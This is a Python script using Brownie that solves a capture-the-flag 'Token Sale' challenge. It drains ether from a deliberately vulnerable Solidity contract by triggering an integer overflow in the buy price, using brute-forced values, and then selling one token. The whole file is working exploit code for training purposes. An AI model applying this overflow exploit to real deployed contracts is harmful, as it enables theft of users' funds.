from lib2to3.pgen2 import token
from scripts.helper.utils import *
from scripts.helper.account import _from, acc
from brownie import TokenSaleChallenge
import pandas as pd
from math import floor

##########################################
# This token contract allows you to buy and sell tokens at an even exchange rate of 1 token per ether.
# The contract starts off with a balance of 1 ether. See if you can take some of that away.
#########################################

# solve the challenge
def solve_challenge(locally=False):
    # load challenge
    if not locally:
        token_sale = load_challenge(ContractObject=TokenSaleChallenge, instance_key='token_sale')
    else:
        token_sale = deploy_locally(ContractObject=TokenSaleChallenge, from_account=_from | {'value':1e18}, constructor_params=[acc.address])
    
    # import bruteforcing data
    data = pd.read_csv('./scripts/extras/best_vals.csv').iloc[:,1:]

    # using minimal multiplier + overflow msg.value remainder
    ideal_overflow = data['ideal_overflow'].iloc[0]
    ideal_overflow_multiplier = data['ideal_overflow_multiplier'].iloc[0]

    # amount to buy
    amount = floor(int(int(2**256)*ideal_overflow_multiplier) // int(1e18)) + 1

    # buy `integer overflow` tokens
    token_sale.buy(amount, _from | {'value':ideal_overflow})

    # sell one token
    token_sale.sell(1, _from)

    # print balance left in contract in ether
    print(f'{token_sale.balance() / 1e18:.9f} ether')

    # check if challenge is complete
    result = token_sale.isComplete()
    print(result)

    # return the result
    return result

def main():
    solve_challenge()

